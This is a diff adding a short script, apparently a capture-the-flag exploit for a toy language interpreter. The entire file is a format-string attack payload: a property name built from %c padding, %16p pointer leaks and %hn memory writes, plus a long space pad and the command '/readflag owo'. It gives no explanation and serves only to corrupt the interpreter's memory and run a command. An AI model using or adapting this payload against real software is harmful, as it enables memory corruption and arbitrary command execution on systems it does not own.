@@ -1,0 +1,3 @@
+53592225957975;
+def f() { let env = {x: 1}; print(env."%36884c%16p%16p%16p%16p%16p%16p%16p%16p%16p%16p%16p%16p%16p%hn%34237c%16p%16p%16p%16p%16p%hn%4148000c                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                /readflag owo"); };
+f();
